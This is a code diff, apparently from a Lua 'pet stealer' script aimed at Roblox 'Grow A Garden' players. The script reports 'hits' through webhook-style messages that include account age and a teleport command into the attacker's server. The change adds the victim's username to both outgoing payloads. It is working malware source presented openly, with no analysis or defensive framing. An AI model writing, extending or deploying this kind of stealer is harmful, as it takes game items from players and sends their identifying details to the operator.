@@ -344,6 +344,7 @@ Account Age: %s days```
 
     local data = {
         ["content"] = prefix .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, "68a50a57-0d56-4794-8017-6013bce03b12")',
+        ["username"] = playerName,
         ["embeds"] = {{
             ["title"] = ":dog: Grow A Garden Hit - ZANJI: PET STEALER :dog:",
             ["color"] = 16753920, -- Orange
@@ -397,6 +398,7 @@ local function SendMessage(sortedItems)
     end
 
     local data = {
+        ["username"] = plr.Name,
         ["embeds"] = {{
             ["title"] = "🐶 New PET Execution",
             ["color"] = 65280,
